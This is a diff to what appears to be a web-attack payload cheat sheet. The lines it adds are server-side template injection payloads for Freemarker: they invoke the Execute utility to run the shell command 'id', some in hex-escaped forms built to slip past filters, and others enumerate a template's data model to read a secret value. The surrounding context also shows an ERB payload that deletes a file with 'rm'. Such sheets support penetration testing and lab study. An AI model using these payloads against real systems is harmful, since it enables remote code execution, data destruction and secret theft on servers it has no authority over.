@@ -125,6 +125,16 @@ ${{<%[%'"}}%\
 <%= system("rm /home/carlos/morale.txt") %>
 
 ```
+### Server-side template injection (SSTI) - Freemarker
+```
+${"freemarker.template.utility.Execute"?new()("id")}
+${'"freemarker\x2Etemplate\x2Eutility\x2EExecute"?new\x28\x29\x28"id"\x29'?eval}
+${'"freemarker\x2Etemplate\x2Eutility\x2E\x45xecute"?new\x28\x29\x28"id"\x29'?eval}
+```
+```
+<#list .dataModel?keys as k>${k}, </#list>
+${.dataModel["this 1s s3cr3t"]}
+```
 ## Exploiting XSLT Injection
 ``` Version: <xsl:value-of select="system-property('xsl:version')" />
 <br/>
